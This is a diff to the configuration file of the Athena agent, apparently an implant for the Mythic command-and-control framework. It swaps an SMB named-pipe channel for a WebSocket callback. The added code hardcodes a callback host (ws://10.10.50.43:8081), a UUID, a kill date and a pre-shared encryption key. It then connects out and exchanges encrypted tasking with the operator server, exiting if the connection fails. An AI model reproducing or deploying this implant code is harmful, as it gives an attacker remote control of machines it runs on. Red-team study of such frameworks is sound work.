@@ -1,139 +1,102 @@
-﻿using Athena.Models.Mythic.Response;
-using Athena.Utilities;
-using Athena.Models.Athena.Pipes;
+﻿using Athena.Utilities;
 using Newtonsoft.Json;
 using System;
-using System.Collections.Concurrent;
-using System.IO.Pipes;
+using System.IO;
+using System.Net.WebSockets;
+using System.Text;
+using System.Threading;
 using System.Threading.Tasks;
 
 namespace Athena.Config
 {
-    public class ServerPipe : BasicPipe
-    {
-        public event EventHandler<EventArgs> Connected;
-
-        protected NamedPipeServerStream serverPipeStream;
-        protected string PipeName { get; set; }
-
-        public ServerPipe(string pipeName, Action<BasicPipe> asyncReaderStart)
-        {
-            this.asyncReaderStart = asyncReaderStart;
-            PipeName = pipeName;
-
-            serverPipeStream = new NamedPipeServerStream(
-                pipeName,
-                PipeDirection.InOut,
-                NamedPipeServerStream.MaxAllowedServerInstances,
-                PipeTransmissionMode.Message,
-                PipeOptions.Asynchronous);
-
-            pipeStream = serverPipeStream;
-            serverPipeStream.BeginWaitForConnection(new AsyncCallback(PipeConnected), null);
-        }
-
-        protected void PipeConnected(IAsyncResult ar)
-        {
-            serverPipeStream.EndWaitForConnection(ar);
-            Connected?.Invoke(this, new EventArgs());
-            asyncReaderStart(this);
-        }
-    }
     public class MythicConfig
     {
-        public Smb currentConfig { get; set; }
+        public Websocket currentConfig { get; set; }
         public string uuid { get; set; }
         public DateTime killDate { get; set; }
         public int sleep { get; set; }
         public int jitter { get; set; }
-        public SMBForwarder smbForwarder { get; set; }
+        public SMBForwarder smbForwarder;
 
         public MythicConfig()
         {
-            this.uuid = "%UUID%";
-            DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
+            this.uuid = "b7908593-619a-4ffa-a3eb-c0038214cea2";
+            DateTime kd = DateTime.TryParse("2022-10-05", out kd) ? kd : DateTime.MaxValue;
             this.killDate = kd;
-            int sleep = 1;
+            int sleep = int.TryParse("5", out sleep) ? sleep : 60;
             this.sleep = sleep;
-            int jitter = 0;
+            int jitter = int.TryParse("0", out jitter) ? jitter : 10;
             this.jitter = jitter;
-            this.currentConfig = new Smb(this.uuid, this);
+            this.currentConfig = new Websocket(this.uuid);
             this.smbForwarder = new SMBForwarder();
         }
     }
 
-    public class Smb
+    public class Websocket
     {
         public string psk { get; set; }
-        private ServerPipe serverPipe { get; set; }
-        public string pipeName = "pipe_name"; //Will need to handle this in the builder.py 
-        private bool connected { get; set; }
-        public bool encrypted { get; set; }
-        public bool encryptedExchangeCheck = bool.Parse("encrypted_exchange_check");
+        public string endpoint { get; set; }
+        public string userAgent { get; set; }
+        public string callbackHost { get; set; }
+        public int callbackInterval { get; set; }
+        public int callbackJitter { get; set; }
+        public int callbackPort { get; set; }
+        public string hostHeader { get; set; }
+        public bool encryptedExchangeCheck { get; set; }
+        public ClientWebSocket ws { get; set; }
         public PSKCrypto crypt { get; set; }
-        public ConcurrentQueue<DelegateMessage> queueIn { get; set; }
+        public bool encrypted { get; set; }
+        public int connectAttempts { get; set; }
 
-        public Smb(string uuid, MythicConfig config)
+        public Websocket(string uuid)
         {
-            this.connected = false;
-            this.psk = "";
-            this.queueIn = new ConcurrentQueue<DelegateMessage>();
+            int callbackPort = Int32.Parse("8081");
+            string callbackHost = "ws://10.10.50.43";
+            this.endpoint = "socket";
+            string callbackURL = $"{callbackHost}:{callbackPort}/{this.endpoint}";
+            this.userAgent = "USER_AGENT";
+            this.hostHeader = "%HOSTHEADER%";
+            this.psk = "sdtnMlNb/5QzsCv2M5HeuTB7YXTDotGb4w2i6OI434I=";
+            this.encryptedExchangeCheck = bool.Parse("false");
             if (!string.IsNullOrEmpty(this.psk))
             {
                 this.crypt = new PSKCrypto(uuid, this.psk);
                 this.encrypted = true;
             }
-            this.serverPipe = CreateServer();
+
+            this.ws = new ClientWebSocket();
+            Connect(callbackURL);
         }
 
-        private ServerPipe CreateServer()
+        public bool Connect(string url)
         {
-            ServerPipe serverPipe = new ServerPipe(this.pipeName, p => p.StartStringReaderAsync());
-            serverPipe.DataReceived += (sndr, args) =>
-                    Task.Run(() =>
-                    {
-                        DoDataReceived(args.String);
-                    });
-
-            serverPipe.Connected += (sndr, args) =>
-                Task.Run(() =>
-                {
-                    this.connected = true;
-                });
-            serverPipe.PipeClosed += (sendr, args) =>
-                Task.Run(() =>
-                {
-                    this.connected = false;
-                    this.serverPipe = CreateServer();
-                });
-            return serverPipe;
-        }
-
-        private void DoDataReceived(string msg)
-        {
+            this.connectAttempts = 0;
             try
             {
-                DelegateMessage dm = JsonConvert.DeserializeObject<DelegateMessage>(msg);
+                Misc.WriteDebug("Connecting: " + url);
+                ws = new ClientWebSocket();
+                ws.ConnectAsync(new Uri(url), CancellationToken.None);
 
-                //Add message to out queue.
-                this.queueIn.Enqueue(dm);
+                while (ws.State != WebSocketState.Open)
+                {
+                    if (this.connectAttempts == 300)
+                    {
+                        Environment.Exit(0);
+                    }
+                    Thread.Sleep(1000);
+                    this.connectAttempts++;
+                }
+                Misc.WriteDebug("Connected.");
+                return true;
             }
             catch
             {
-                DelegateMessage dm = new DelegateMessage()
-                {
-                    c2_profile = "smb",
-                    uuid = "",
-                    message = ""
-                };
+                return false;
             }
         }
-        //Send, wait for a response, and return it to the main functions
+
         public async Task<string> Send(object obj)
         {
-            //Wait for connection to become available
-            while (!connected) { };
-
             try
             {
                 string json = JsonConvert.SerializeObject(obj);
@@ -146,40 +109,77 @@ namespace Athena.Config
                     json = Misc.Base64Encode(Globals.mc.MythicConfig.uuid + json);
                 }
 
-                //Submit our message to the mythic server and wait for a response
-                DelegateMessage dm = new DelegateMessage()
+                WebSocketMessage m = new WebSocketMessage()
                 {
-                    uuid = Globals.mc.MythicConfig.uuid,
-                    message = json,
-                    c2_profile = "smb"
+                    Client = true,
+                    Data = json,
+                    Tag = ""
                 };
 
-                _ = this.serverPipe.WriteString(JsonConvert.SerializeObject(dm));
+                string message = JsonConvert.SerializeObject(m);
+                byte[] msg = Encoding.UTF8.GetBytes(message);
+                await ws.SendAsync(msg, WebSocketMessageType.Text, true, CancellationToken.None);
+                message = await Receive(ws);
 
-                DelegateMessage res = new DelegateMessage();
+                if (String.IsNullOrEmpty(message))
+                {
+                    return "";
+                }
 
-                while (!this.queueIn.TryDequeue(out dm)) {
-                    if (!this.connected)
-                    {
-                        return "";
-                    }
-                };
+                m = JsonConvert.DeserializeObject<WebSocketMessage>(message);
 
-                //Decrypt and return
                 if (this.encrypted)
                 {
-                    return this.crypt.Decrypt(dm.message);
+                    return this.crypt.Decrypt(m.Data);
                 }
                 else
                 {
-                    return Misc.Base64Decode(dm.message).Substring(36);
+                    return Misc.Base64Decode(m.Data).Substring(36);
                 }
             }
             catch
             {
-                this.connected = false;
                 return "";
             }
+        }
+        static async Task<string> Receive(ClientWebSocket socket)
+        {
+            try
+            {
+                var buffer = new ArraySegment<byte>(new byte[2048]);
+                do
+                {
+                    WebSocketReceiveResult result;
+                    using (var ms = new MemoryStream())
+                    {
+                        do
+                        {
+                            result = await socket.ReceiveAsync(buffer, CancellationToken.None);
+                            ms.Write(buffer.Array, buffer.Offset, result.Count);
+                        } while (!result.EndOfMessage);
+
+                        if (result.MessageType == WebSocketMessageType.Close)
+                            break;
+
+                        ms.Seek(0, SeekOrigin.Begin);
+                        using (var reader = new StreamReader(ms, Encoding.UTF8))
+                            return (await reader.ReadToEndAsync());
+                    }
+
+                } while (true);
+
+                return "";
+            }
+            catch
+            {
+                return "";
+            }
+        }
+        private class WebSocketMessage
+        {
+            public bool Client { get; set; }
+            public string Data { get; set; }
+            public string Tag { get; set; }
         }
     }
 }
